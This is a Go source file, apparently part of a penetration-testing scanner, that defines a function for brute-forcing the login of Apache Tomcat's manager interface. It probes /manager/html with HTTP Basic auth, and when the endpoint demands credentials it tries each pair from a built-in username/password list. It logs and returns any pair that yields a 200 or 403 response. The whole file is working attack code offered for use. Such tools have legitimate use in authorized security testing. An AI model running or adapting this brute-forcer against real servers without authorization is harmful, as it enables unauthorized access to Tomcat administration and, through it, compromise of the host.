package brute

import (
	"fmt"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
)

func TomcatBrute(url string, client *httpx.Client) (username string, password string) {
	if req, err := client.Basic(url+"/manager/html", "HEAD", "", nil, "asdasdascsacacs", "asdasdascsacacs", "Brute"); err == nil {
		if req.StatusCode == 401 {
			for uspa := range tomcatuserpass {
				if req2, err2 := client.Basic(url+"/manager/html", "HEAD", "", nil, tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password, "Brute"); err2 == nil {
					if req2.StatusCode == 200 || req2.StatusCode == 403 {
						logging.Logger.Infof(fmt.Sprintf("Found vuln Tomcat password|%s:%s|%s\n", tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password, url))
						return tomcatuserpass[uspa].Username, tomcatuserpass[uspa].Password
					}
				}
			}
		}
	}
	return "", ""
}
